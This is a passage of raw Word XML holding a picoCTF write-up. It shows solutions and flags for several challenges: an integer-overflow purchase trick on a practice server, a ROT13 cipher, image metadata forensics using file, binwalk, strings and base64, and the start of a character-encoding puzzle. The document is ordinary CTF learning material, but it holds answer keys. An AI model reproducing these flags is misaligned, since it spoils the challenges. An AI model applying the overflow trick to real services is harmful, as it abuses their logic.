      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>account_balance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>3000000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> works nicely as the number of fake flags to buy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CDF9F8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FFB5AAA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58D1EEBE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ nc jupiter.challenges.picoctf.org 4906</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C0D7B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="4" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="50A6F926" wp14:editId="30B10CDC">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>222885</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-600710</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5886450" cy="37909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35"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5886450" cy="3790950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="691FBE59" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D651C0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="160AD811" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="390FC930" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>1_wanna_b3_a_r0ck5tar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA60C15" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>| 350 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562A4CB5" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCD95BE" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Author: Alex Bushkin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF679A1" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A50D00" w14:textId="7FCC70FE" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">I wrote you another </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:tgtFrame="_blank">
        <w:r w:rsidRPr="00C36E31">
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
            <w:highlight w:val="yellow"/>
          </w:rPr>
          <w:t>song</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>. Put the flag in the picoCTF{} flag format</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6117B708" w14:textId="3B716337" w:rsidR="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F80083" w14:textId="503858A9" w:rsidR="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CAE38A4" w14:textId="4953FA4A" w:rsidR="00C36E31" w:rsidRPr="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Cryptography</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCFE967" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Mod 26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3A0D22" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>| 10 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A16765E" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC7C3A6" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CA9866E" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Pandu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E96FC9C" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7165AD8F" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50F5804F" w14:textId="1F1EE4FC" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Cryptography can be easy, do you know what ROT13 is? cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_MAZyqFQj}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F43688A" w14:textId="26AA5CF2" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>ROT13 ("rotate by 13 places",</w:t>
      </w:r>
      <w:r w:rsidRPr="00C36E31">
        <w:t xml:space="preserve"> sometimes hyphenated ROT-13) is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the alphabet. ROT13 is a special case of the Caesar cipher which was developed in ancient Rome.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BC7C30" w14:textId="09F53A32" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC65447" w14:textId="263E3AD2" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:t>picoCTF{next_time_I'll_try_2_rounds_of_rot13_ZNMldSDw}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6347A8" w14:textId="47C0C8CE" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03231632" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74173242" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>| 10 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F013BA" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3199D0" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E6B933" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: susie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085B9E17" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCC938D" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49E45955" w14:textId="73A63BE9" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Files can always be changed in a secret way. Can you find the flag? cat.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B554D90" w14:textId="228D57B8" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="236AEF7C" w14:textId="30478B68" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="00C36E31">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Whenever I get an image file, I go and run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> (to make sure it's an image), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> (to see if there are hidden files), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> and usually I pair that with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> and lastly I check the image in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>hexeditor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>, just to check the header and such.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419C6DA3"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 xml:space="preserve">root@kali:~/Downloads# file cat.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2926E48D"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cat.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541AC2FF"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 xml:space="preserve">root@kali:~/Downloads# binwalk cat.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B79F4F" w14:textId="77777777" w:rsidR="006348ED" w:rsidRPr="006348ED" w:rsidRDefault="006348ED" w:rsidP="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C67580B"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DECIMAL       HEXADECIMAL     DESCRIPTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A95644"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525F585A"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0             0x0             JPEG image data, JFIF standard 1.02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECD52E2" w14:textId="77777777" w:rsidR="006348ED" w:rsidRPr="006348ED" w:rsidRDefault="006348ED" w:rsidP="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15F167F2"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root@kali:~/Downloads# strings cat.jpg |grep 'picoCTF'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BBF2D1" w14:textId="692D5919" w:rsid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root@kali:~/Downloads#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8101C9" w14:textId="300B8E27" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B37CAB3" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70861BC6" w14:textId="40E9144A" w:rsidR="00C36E31" w:rsidRDefault="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48BC3C24" wp14:editId="785C0213">
            <wp:extent cx="4945809" cy="3208298"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4945809" cy="3208298"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D383169" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54F0880C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15EE467B" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>root@kali:~/Downloads# echo cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 |base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA02667" w14:textId="628BC0AF" w:rsidR="00590591" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{the_m3tadata_1s_modified}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266BE672" w14:textId="14747A55" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5385DD54" w14:textId="5188C02C" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="375EB2E7" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRPr="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00740B7E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Transformation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47021997" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>| 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369C8F3F" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F30321D" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66FF4E49" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: madStacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6B38DC" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7130CF" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06413DF7" w14:textId="20F2F752" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>I wonder what this really is... enc ''.join([chr((ord(flag[i]) &lt;&lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2406C215" w14:textId="3250696F" w:rsidR="00313A37" w:rsidRDefault="00313A37" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05B29D04"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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>encoded_string</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>灩捯䍔䙻</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Malgun Gothic" w:eastAsia="Malgun Gothic" w:hAnsi="Malgun Gothic" w:cs="Malgun Gothic"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>ㄶ形</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>楴獟楮獴</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>㌴摟潦弸弰</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>㑣</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>〷㘰摽</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
